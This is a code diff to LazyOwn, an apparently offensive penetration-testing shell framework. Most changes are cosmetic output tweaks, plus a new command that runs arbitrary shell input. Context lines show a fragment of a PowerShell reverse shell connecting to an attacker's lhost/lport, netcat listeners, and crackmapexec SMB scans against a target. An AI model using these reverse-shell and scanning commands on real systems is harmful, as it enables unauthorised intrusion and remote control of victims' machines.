@@ -105,13 +105,11 @@ def activate_virtualenv(venv_path):
 
     # Captura la salida del proceso hijo
     stdout, stderr = process.communicate()
-    print(stdout)
-    print(stderr)
     print(f"{GREEN}[+] Entorno Activado.{RESET}")
 
 class LazyOwnShell(Cmd):
     prompt = "LazyOwn> "
-    intro = f"""{YELLOW}\n[*] Welcome to the LazyOwn Framework [;,;] {BLUE}{version} {WHITE}interactive shell! Type ? to list commands{BLUE}
+    intro = f"""{YELLOW}[*] Welcome to the LazyOwn Framework [;,;] {BLUE}{version} {WHITE}interactive shell! Type ? to list commands{BLUE}
 {GREEN}[+] Github:{BLUE} https://github.com/grisuno/LazyOwn
 {GREEN}[+] Web:{BLUE} https://grisuno.github.io/LazyOwn/
 {GREEN}[+] Reddit:{BLUE} https://www.reddit.com/r/LazyOwn/
@@ -970,7 +968,7 @@ class LazyOwnShell(Cmd):
                 "add domain and rhost must be set to more info see help set (set rhost 10.10.10.10) ex: addhost domain.ext"
             )
             return
-        print(f"[+] Try... crackmapexec smb 10.10.11.24")
+        print(f"[+] Try... crackmapexec smb {rhost}")
         os.system(f"crackmapexec smb {rhost}")
         print(f"[*] Done... crackmapexec smb {rhost}")
         return
@@ -1002,9 +1000,9 @@ class LazyOwnShell(Cmd):
 
                     # Determinar basado en el TTL
                     if ttl_value <= 60 or ttl_value <= 64:
-                        print("[*] Probablemente es Linux")
+                        print(f"{GREEN}[*]Host activo {CYAN}probablemente es {BLUE}Linux{RESET}")
                     elif ttl_value <= 120 or ttl_value <= 128:
-                        print("[*] Probablemente es Windows")
+                        print(f"{GREEN}[*]Host activo {CYAN}probablemente es {RED}Windows{RESET}")
                     else:
                         print(
                             "[-] No se puede determinar con certeza el sistema operativo"
@@ -1308,6 +1306,22 @@ $client = New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream =
         else:
             print(f"{GREEN}[+] Try.. nc -lvnp {line}{RESET}")
             os.system(f"nc -lvnp {line}")
+        return
+    def do_sh(self,line):
+        """execute some command direct in shell to avoid exit LazyOwn ;)"""
+        if not line:
+            print(f"{YELLOW}[?] you must pass the command linke argument")
+            return
+        print(f"{GREEN}[*]Try... {line}{RESET}")
+        os.system(f"{line}")
+        return
+
+    def do_pwd(self,line):
+        """'echo -e "[\e[96m`pwd`\e[0m]\e[34m" && ls && echo -en "\e[0m"'"""
+        print(f'{GREEN}[*]Try echo -e "[\e[96m`pwd`\e[0m]\e[34m" && ls && echo -en "\e[0m"{RESET}')
+        os.system('echo -e "[\e[96m`pwd`\e[0m]\e[34m" && ls && echo -en "\e[0m"')
+        os.system("pwd | xclip -sel clip")
+        print(f"{GREEN}[*] pwd directory copied to clipboard{RESET}")
         return
 
     def do_vpn(self,line):
